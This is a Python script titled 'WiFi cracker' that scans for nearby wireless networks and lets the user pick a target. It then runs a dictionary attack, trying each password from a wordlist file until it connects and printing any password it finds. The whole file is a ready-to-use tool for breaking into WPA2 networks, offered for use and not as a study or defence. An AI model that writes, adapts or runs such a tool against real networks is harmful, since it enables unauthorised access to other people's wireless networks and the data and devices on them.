from pywifi import const, PyWiFi, Profile
from termcolor import cprint
from itertools import cycle
import winsound
import time
import os


def beep():
    winsound.Beep(700, 500)
    winsound.Beep(1000, 500)


def scan():
    interface.scan()
    for i in range(12):
        for char in '/-\|':
            print(f'\r Scanning... {char}', end='')
            time.sleep(.15)

    return interface.scan_results()


def test_wifi(ssid, password):
    interface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.connect(interface.add_network_profile(profile))
    time.sleep(.7)

    if interface.status() == const.IFACE_CONNECTED:
        interface.remove_network_profile(profile)
        return True

    else:
        interface.remove_network_profile(profile)
        return False


def select(items):
    print('\n')
    for idx, item in enumerate(items, 1):
        print(f' {idx}_ {item}')
        time.sleep(.7)

    time.sleep(1)
    selected_item = input("\n Select a host to start cracking: ")

    while True:
        try:
            selected_item = int(selected_item)
            assert selected_item <= len(items) and selected_item > 0
            selected_item -= 1
            break

        except AssertionError:
            print(f'\n "{selected_item}" is not a valid host number')
            selected_item = input('\n Please enter a valid host: ')

        except:
            if selected_item in items:
                selected_item = items.index(selected_item)
                break

            else:
                print(f'\n "{selected_item}" is not a valid host name')
                selected_item = input('\n Please enter a valid host: ')


    return items[selected_item]


os.system('cls')

wifi = PyWiFi()
interface = wifi.interfaces()[0]
colors = iter(cycle(['blue', 'red']))
password_list = "password-list.txt"

time.sleep(.5)
print('\n Welcome to WiFi cracker(written by Sina.f)\n')
time.sleep(1)

hosts = [host.ssid for host in scan()]

if hosts:
    target = select(hosts)
    tests = 0
    print()
    
    with open(os.path.realpath(password_list)) as passlist:
        for password in passlist.readlines():
            if len(password) < 8:
                continue

            color = next(colors)
            cprint(f' Testing: {password}', color=color)
            tests += 1

            if test_wifi(target, password):
                beep()
                print()
                print(format(' ', '-<30'))
                cprint(f' PASSWORD: {password}', color='green')
                print(f' {tests} Password tested!')
                print(format(' ', '-<30'))
                break

else:
    print('\n\n No WiFi available!\n')


figlet = '''\n
   _____ _                __ 
  / ____(_)              / _|
 | (___  _ _ __   __ _  | |_ 
  \___ \| | '_ \ / _` | |  _|
  ____) | | | | | (_| |_| |  
 |_____/|_|_| |_|\__,_(_)_| 
\n\n'''

for line in figlet.splitlines():
    print(line)
    time.sleep(.2)

time.sleep(1)
input(' Press <enter> to exit...')
